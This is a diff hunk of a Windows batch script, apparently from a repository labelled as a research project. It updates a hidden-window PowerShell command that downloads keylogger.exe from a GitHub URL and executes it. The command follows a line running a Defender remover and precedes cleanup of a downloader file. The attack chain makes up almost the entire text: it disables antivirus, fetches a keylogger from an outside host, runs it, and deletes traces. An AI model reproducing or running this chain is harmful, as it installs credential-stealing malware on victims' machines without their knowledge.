@@ -39,7 +39,7 @@ defender_remover.exe Y
 @REM Download and execute keylogger
 
 TIMEOUT /T 50
-powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/keylogger.exe' -OutFile keylogger.exe"
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/Reiya-cyber/ResearchProject/raw/refs/heads/Gabriel/Original/Resources/keylogger.exe' -OutFile keylogger.exe"
 keylogger.exe 
 
 del wget.cmd
